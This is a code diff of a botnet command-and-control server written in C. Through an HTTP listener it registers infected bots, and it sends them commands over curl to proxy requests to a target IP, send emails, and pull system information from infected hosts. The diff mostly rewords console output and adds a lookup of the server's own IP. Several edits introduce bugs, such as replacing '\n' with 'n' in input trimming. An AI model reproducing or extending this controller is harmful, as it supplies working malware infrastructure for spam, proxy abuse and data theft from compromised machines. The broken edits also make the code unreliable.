@@ -73,17 +73,20 @@ void parent(/*int pid*/)
 
         char command[10];
         printf("\nInsert Command : ");
-        fgets(command, 10, stdin);
+
+        
+        fgets(command, 10, stdin) ;
+        fflush(stdin);
 
         if (strcmp(command, LIST) == 0)
         {
-            printf("Listing active bots of current botnet \n");
+            printf("\nListing active bots of current botnet ");
 
             list_botnet(1);
         }
         else if (strcmp(command, QUIT) == 0)
         {
-            printf("Stop C&C \n");
+            printf("\nStop C&C ");
             free(botnet);
 
             ret = closeSemaphores();
@@ -105,7 +108,7 @@ void parent(/*int pid*/)
 
         else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
         {
-            printf("Choose bot to which send command \n");
+            printf("\nChoose bot to which send command ");
 
             ret = list_botnet(0);
 
@@ -118,7 +121,7 @@ void parent(/*int pid*/)
 
             if (botExists(bot) < 0)
             {
-                printf("Not a valid bot id \n");
+                printf("\nNot a valid bot id ");
                 continue;
             }
             else
@@ -128,9 +131,8 @@ void parent(/*int pid*/)
         }
         else
         {
-            printf("Error, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s \n ",
+            printf("\nError, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s",
                    HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);
-
             continue;
         }
     }
@@ -144,11 +146,22 @@ void child()
     mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
     if (mhd_daemon == NULL)
     {
-        fprintf(stderr, "Error starting daemon.\n");
+        fprintf(stderr, "Error starting daemon.n");
         _exit(EXIT_FAILURE);
     }
 
-    fprintf(stdout, "Child process started. Listening on port %d.\n", 8081);
+    struct hostent *host_entry;
+    int hostname;
+    char host[256];
+    char * IP;
+    
+    hostname = gethostname(host, sizeof(host));                      // find the host name
+    host_entry = gethostbyname(host);                                // find host information
+    IP = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0])); // Convert into IP string
+
+
+
+    printf("\nChild process started. Listening on port %d. with Ip : %s\n", 8081, IP);
     while (1)
     {
         sleep(1);
@@ -177,22 +190,22 @@ void sendCommand(char *command, int bot_id)
 
         if (botExists(bot_id) < 0)
         {
-            printf("Bot with id: %d does not exists\n", bot_id);
+            printf("\nBot with id: %d does not exists", bot_id);
             return;
         }
 
         ret = setBotInfo(&bot_port, bot_ip, bot_id);
         if (ret < 0)
         {
-            printf("Could not set bot info");
+            printf("\nCould not set bot info");
             return;
         }
 
-        printf("Submit target's ip in dot decimal notation: \n");
+        printf("\nSubmit target's ip in dot decimal notation: ");
 
         fgets(target_ip, sizeof(target_ip), stdin);
 
-        target_ip[strcspn(target_ip, "\n")] = 0;
+        target_ip[strcspn(target_ip, "n")] = 0;
 
         updateBotInfo(bot_id, target_ip, command);
 
@@ -210,7 +223,7 @@ void sendCommand(char *command, int bot_id)
         {
             char request[MAX_REQ_SIZE];
 
-            printf("Insert request to proxy : ");
+            printf("\nInsert request to proxy : ");
             scanf("%s", request);
             char *new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
             memcpy(new_url, url, sizeof(url));
@@ -218,13 +231,13 @@ void sendCommand(char *command, int bot_id)
             strcat(new_url, request);
             curl_easy_setopt(curl, CURLOPT_URL, new_url);
 
-            printf("Sending request:  %s to bot...\n", new_url);
+            printf("\nSending request:  %s ", new_url);
             free(new_url);
         }
 
         if (strcmp(command, EMAIL) == 0)
         {
-            printf("Sending emails ");
+            printf("\nSending emails ");
 
             strcat(url, "/email");
 
@@ -232,7 +245,7 @@ void sendCommand(char *command, int bot_id)
         }
         if (strcmp(command, SYS_INFO) == 0)
         {
-            printf("Retrieving infected system info\n");
+            printf("\nRetrieving infected system info");
 
             strcat(url, "/sys_info");
             curl_easy_setopt(curl, CURLOPT_URL, url);
@@ -273,7 +286,7 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
         {
             const char *msg = "NOT OK";
         }
-        printf("Bot Connected \n");
+        printf("\nBot Connected ");
     }
 
     char *endpoint;
@@ -281,14 +294,14 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     if (endpoint != NULL)
     {
 
-        printf("Botnet : \n");
+        printf("\nBotnet : ");
         list_botnet(1);
 
-        printf("Bot completed its task...\n");
+        printf("\nBot completed its task...");
         int ID = getBotID(bot_ip, bot_port);
         if (ID == -1)
         {
-            printf("BOT %s:%s not present in botnet\n", bot_ip,bot_port);
+            printf("\nBOT %s:%s not present in botnet", bot_ip,bot_port);
         }else{
 
             updateBotInfo(ID,"","");
@@ -298,7 +311,7 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
         endpoint = NULL;
     }
 
-    printf("Botnet updated: \n");
+    printf("\nBotnet updated: ");
     list_botnet(1);
 
     MHD_destroy_response(response);
